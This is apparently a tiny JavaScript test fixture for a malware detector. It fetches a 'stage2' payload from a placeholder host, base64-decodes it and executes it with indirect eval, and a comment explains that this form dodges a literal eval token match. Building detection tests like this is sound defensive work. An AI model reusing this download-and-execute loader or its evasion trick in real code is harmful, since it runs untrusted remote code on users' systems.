// FIXTURE ONLY — synthetic detection test sample, not real malware
// Evasion variant: indirect eval `(0, eval)(...)` dodges a literal `eval(` token while still
// decode-and-executing a fetched (non-literal) payload.
const stage = await (await fetch("http://drop.invalid/stage2")).text();
(0, eval)(atob(stage));
